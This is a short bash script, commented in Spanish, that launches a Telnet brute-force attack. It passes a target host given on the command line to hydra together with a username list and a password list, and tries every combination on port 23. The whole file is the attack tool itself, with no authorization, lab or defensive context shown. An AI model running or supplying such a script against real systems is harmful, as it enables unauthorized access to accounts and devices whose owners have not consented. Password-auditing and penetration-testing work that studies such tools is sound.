#!/bin/bash
# Fuerza bruta Telnet
echo
echo $1
hydra -L usuarios.txt -P claves.txt telnet://$1:23
